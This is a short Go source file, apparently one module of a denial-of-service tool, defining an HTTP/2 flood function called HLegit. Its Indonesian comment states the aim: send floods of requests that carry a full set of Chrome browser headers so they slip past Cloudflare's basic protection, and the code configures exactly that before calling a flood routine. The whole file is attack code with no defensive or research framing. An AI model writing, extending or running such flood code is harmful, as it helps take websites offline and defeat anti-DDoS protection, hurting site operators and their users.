package tactics

import "context"

// HLegit — legitimate-looking flood (header browser lengkap + HTTP/2) agar lolos
// proteksi dasar Cloudflare. Meniru pola permintaan browser sungguhan.
func HLegit(ctx context.Context, p Params) (int64, error) {
	cfg := floodConfig{
		httpMethod: "GET",
		http2:      true,
		keepAlive:  true,
		headers: map[string]string{
			"sec-ch-ua":                `"Chromium";v="152", "Not_A Brand";v="24", "Google Chrome";v="152"`,
			"sec-ch-ua-mobile":         "?0",
			"sec-ch-ua-platform":       `"Windows"`,
			"upgrade-insecure-requests": "1",
			"accept":                   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
			"sec-fetch-site":           "none",
			"sec-fetch-mode":           "navigate",
			"sec-fetch-user":           "?1",
			"sec-fetch-dest":           "document",
			"accept-language":          "en-US,en;q=0.9",
			"accept-encoding":          "gzip, deflate, br, zstd",
			"priority":                 "u=0, i",
		},
	}
	return runFlood(ctx, p, cfg)
}
